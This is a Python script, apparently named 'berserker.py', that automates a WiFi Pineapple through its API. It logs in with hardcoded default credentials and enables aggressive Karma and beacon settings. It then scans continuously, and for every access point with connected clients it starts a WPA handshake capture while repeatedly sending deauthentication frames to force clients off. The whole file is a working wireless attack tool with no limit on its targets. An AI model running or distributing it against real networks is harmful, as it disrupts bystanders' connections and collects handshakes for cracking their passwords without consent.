import requests
import time
import logging
import os
from datetime import datetime

# wifi pineapple settings
config = {
    'server_ip': "172.16.42.1",
    'server_port': 1471,
    'admin_user': "root",
    'admin_password': "1111"
}

# logging
logs_dir = "logs"
os.makedirs(logs_dir, exist_ok=True)
log_filename = os.path.join(logs_dir, datetime.now().strftime("berserker-log-%Y-%m-%d-%H-%M-%S.txt"))
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filemode='w'
)

def log_and_print(message):
    print(message)
    logging.info(message)

def authenticate():
    endpoint = f"http://{config['server_ip']}:{config['server_port']}/api/login"
    payload = {
        'username': config['admin_user'],
        'password': config['admin_password']
    }
    headers = {'Content-Type': 'application/json'}

    response = requests.post(endpoint, json=payload, headers=headers)
    if response.status_code != 200:
        log_and_print(f"Authentication Error: {response.status_code}, {response.text}")
        exit()

    return response.json()['token']

auth_token = authenticate()

def authorized_request(method, resource, params=None, message=None):
    if message:
        log_and_print(f"> {message}")

    endpoint = f"http://{config['server_ip']}:{config['server_port']}{resource}"
    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {auth_token}'
    }

    time.sleep(5)  # simulate slow device

    if method == "POST":
        response = requests.post(endpoint, json=params, headers=headers) if params else requests.post(endpoint, headers=headers)
    elif method == "PUT":
        response = requests.put(endpoint, json=params, headers=headers)
    elif method == "GET":
        response = requests.get(endpoint, params=params, headers=headers)
    else:
        raise ValueError("Unsupported method")

    if response.status_code != 200:
        log_and_print(f"Request Error: {response.status_code}, {response.text}")
        exit()

    return response.json()

def set_aggro():
    pineAP_aggro_settings = {
        'mode': 'advanced',
        'settings': {
            'ap_channel': '11',
            'autostart': True,
            'autostartPineAP': True,
            'beacon_interval': 'AGGRESSIVE',
            'beacon_response_interval': 'AGGRESSIVE',
            'beacon_responses': True,
            'broadcast_ssid_pool': True,
            'capture_ssids': True,
            'connect_notifications': False,
            'disconnect_notifications': False,
            'enablePineAP': True,
            'karma': True,
            'logging': True,
            'pineap_mac': '00:13:37:A8:1C:BB',
            'target_mac': 'FF:FF:FF:FF:FF:FF'
        }
    }
    authorized_request("PUT", "/api/pineap/settings", pineAP_aggro_settings, "Enabling pineAP (AGGRO settings)")

def run_scand():
    set_aggro()

    authorized_request("POST", "/api/recon/stop", None, "Stopping active recon scans")
    
    scan = authorized_request("POST", "/api/recon/start", {
        'live': True,
        'autoHandshake': True, # what does this actually do? does it conflict when calling /api/recon/handshakes/start ?
        'scan_time': 0,
        'band': '0'
    }, "Starting a continuous recon scan")

    if scan.get('scanRunning') != 1:
        log_and_print("> Recon scan failed, check logs")
        exit()

    log_and_print(f"> Scan initiated ({scan['scanID']})")
    log_and_print("> Sleeping for 90 seconds so the recon list can populate")
    time.sleep(90)

    while True:
        scan_results = authorized_request("GET", f"/api/recon/scans/{scan['scanID']}")
        handshake_req = []
        
        for ap in scan_results.get('APResults', []):
            if ap.get('clients') and ap['bssid'] not in [req['bssid'] for req in handshake_req]:
                log_and_print(f"> Found AP with clients ({ap['bssid']})")
                handshake_req.append({
                    'ssid': '',
                    'bssid': ap['bssid'],
                    'encryption': ap['encryption'],
                    'hidden': ap['hidden'],
                    'wps': ap['wps'],
                    'channel': ap['channel'],
                    'signal': ap['signal'],
                    'data': ap['data'],
                    'last_seen': ap['last_seen'],
                    'probes': ap['probes'],
                    'clients': None
                })

        if handshake_req:
            for hs_req in handshake_req:
                bssid = hs_req['bssid']
                authorized_request("POST", "/api/pineap/handshakes/start", hs_req, f"Starting handshake capture ({bssid})")

                for i in range(9):  # loop for 2 minutes
                    authorized_request("POST", "/api/pineap/deauth/ap", {'bssid': bssid}, "De-authing clients")
                    log_and_print(f"> Capture running, de-authing again in 60 seconds ({i})")
                    time.sleep(60)

                    handshake_status = authorized_request("GET", "/api/pineap/handshakes/check")
                    if not handshake_status.get('captureRunning'):
                        hs = authorized_request("GET", "/api/pineap/handshakes")
                        if hs.get('handshakes'):
                            # fix this; shows capture everytime it checks; could be old handshakes
                            log_and_print("> Handshake captured!")
                            #authorized_request("POST", "/api/pineap/handshakes/stop")
                            break
                        else:
                            log_and_print("> Tried for 2 mins, moving on to next BSSID")
                            authorized_request("POST", "/api/pineap/handshakes/stop")
                            break
        else:
            log_and_print('> No APs with clients found')

        time.sleep(7)  # let's not kill the device

def main():
    log_and_print("> Starting berserker.py by salt-or-ester")
    log_and_print("> https://gitgud.io/saltorester/wifi-pineapple-berserker/")
    run_scand()

if __name__ == "__main__":
    main()
